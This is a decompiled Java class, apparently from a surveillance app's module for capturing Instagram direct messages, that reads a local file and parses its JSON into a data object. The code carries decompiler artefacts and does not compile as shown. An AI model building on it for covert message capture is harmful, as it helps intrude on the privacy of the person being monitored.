package com.vvt.capture.instagram.directmessage;

import com.google.gson.Gson;
import com.vvt.ag.b;
import com.vvt.ak.a;
import com.vvt.capture.instagram.directmessage.data.f;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;

public class d
{
  private static final String a = d.class.getSimpleName();
  private static final boolean b = a.a;
  private static final boolean c = a.e;
  
  public static f a(String paramString)
  {
    f localf = b(paramString);
    if (localf == null) {
      localf = null;
    }
    return localf;
  }
  
  public static f b(String paramString)
  {
    try
    {
      localObject1 = c(paramString);
      boolean bool1 = b.a((String)localObject1);
      if (bool1) {
        break label52;
      }
      Gson localGson = new com/google/gson/Gson;
      localGson.<init>();
      Class localClass = f.class;
      localObject1 = localGson.fromJson((String)localObject1, localClass);
      localObject1 = (f)localObject1;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject1;
        boolean bool2 = c;
        if (bool2) {}
        label52:
        bool2 = false;
        Object localObject2 = null;
      }
    }
    return (f)localObject1;
  }
  
  public static String c(String paramString)
  {
    Object localObject1 = "";
    for (;;)
    {
      try
      {
        localObject2 = new java/io/File;
        ((File)localObject2).<init>(paramString);
        boolean bool1 = ((File)localObject2).exists();
        if (!bool1) {
          continue;
        }
        Object localObject3 = new java/io/FileInputStream;
        ((FileInputStream)localObject3).<init>((File)localObject2);
        int i = ((InputStream)localObject3).available();
        byte[] arrayOfByte = new byte[i];
        ((InputStream)localObject3).read(arrayOfByte);
        ((InputStream)localObject3).close();
        localObject2 = new java/lang/String;
        localObject3 = "UTF-8";
        ((String)localObject2).<init>(arrayOfByte, (String)localObject3);
        localObject1 = localObject2;
      }
      catch (FileNotFoundException localFileNotFoundException)
      {
        Object localObject2;
        bool2 = c;
        if (!bool2) {
          continue;
        }
        continue;
      }
      catch (UnsupportedEncodingException localUnsupportedEncodingException)
      {
        bool2 = c;
        if (!bool2) {
          continue;
        }
        continue;
      }
      catch (IOException localIOException)
      {
        bool2 = c;
        if (!bool2) {
          continue;
        }
        continue;
      }
      catch (Exception localException)
      {
        boolean bool2 = c;
        if (!bool2) {
          continue;
        }
        continue;
      }
      return (String)localObject1;
      bool2 = b;
      if (bool2) {}
      localObject2 = localObject1;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/instagram/directmessage/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */